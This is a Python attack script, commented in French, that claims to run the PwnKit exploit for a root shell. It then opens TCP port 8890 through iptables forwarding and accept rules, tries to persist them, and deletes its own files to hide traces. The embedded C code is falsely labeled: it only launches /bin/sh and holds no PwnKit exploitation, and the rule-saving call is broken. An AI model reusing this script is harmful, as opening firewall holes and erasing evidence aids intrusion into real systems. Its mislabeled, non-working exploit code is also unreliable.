import os
import subprocess
import socket

# Code de l'exploit PwnKit
exploit_code = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *args[] = { "/bin/sh", NULL };
    execv("/bin/sh", args);
    return 0;
}
"""

# Sauvegarde du code C dans un fichier temporaire
exploit_file_path = "/tmp/kit.c"
with open(exploit_file_path, 'w') as f:
    f.write(exploit_code)

# Compilation du code C en un exécutable
compile_result = subprocess.run(["gcc", exploit_file_path, "-o", "/tmp/kit"], capture_output=True, text=True)
print("GCC Compilation Output:")
print(compile_result.stdout)
print("GCC Compilation Error:")
print(compile_result.stderr)

# Définition des permissions pour rendre le fichier exécutable
os.chmod("/tmp/kit", 0o755)

# Exécution de l'exploit pour obtenir un shell root
exploit_result = subprocess.run(["/tmp/kit"], capture_output=True, text=True)
print("Exploit Execution Output:")
print(exploit_result.stdout)
print("Exploit Execution Error:")
print(exploit_result.stderr)

# Récupérer l'adresse IP de l'hôte
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

# sesam
cat = subprocess.run(["cat", "./file.txt"], capture_output=True, text=True)
print("cat Output:")
print(cat.stdout)
print("cat Error:")
print(cat.stderr)

# Configurer la redirection de port pour le port 8890
iptables_prerouting = subprocess.run(["iptables", "-A", "PREROUTING", "-t", "nat", "-i", "eth0", "-p", "tcp", "--dport", "8890", "-j", "DNAT", "--to-destination", f"{ip_address}:8890"], capture_output=True, text=True)
print("IPTables PREROUTING Output:")
print(iptables_prerouting.stdout)
print("IPTables PREROUTING Error:")
print(iptables_prerouting.stderr)

iptables_input = subprocess.run(["iptables", "-A", "INPUT", "-p", "tcp", "--dport", "8890", "-j", "ACCEPT"], capture_output=True, text=True)
print("IPTables INPUT Output:")
print(iptables_input.stdout)
print("IPTables INPUT Error:")
print(iptables_input.stderr)

iptables_forward = subprocess.run(["iptables", "-A", "FORWARD", "-p", "tcp", "-d", ip_address, "--dport", "8890", "-j", "ACCEPT"], capture_output=True, text=True)
print("IPTables FORWARD Output:")
print(iptables_forward.stdout)
print("IPTables FORWARD Error:")
print(iptables_forward.stderr)

iptables_save = subprocess.run(["iptables-save", ">", "/etc/iptables/rules.v4"], shell=True, capture_output=True, text=True)
print("IPTables Save Output:")
print(iptables_save.stdout)
print("IPTables Save Error:")
print(iptables_save.stderr)

# Afficher l'adresse IP
print(f"L'adresse IP de l'hôte est : {ip_address}")

# Nettoyage du code source et du binaire pour des raisons de sécurité
os.remove("/tmp/kit.c")
os.remove("/tmp/kit")
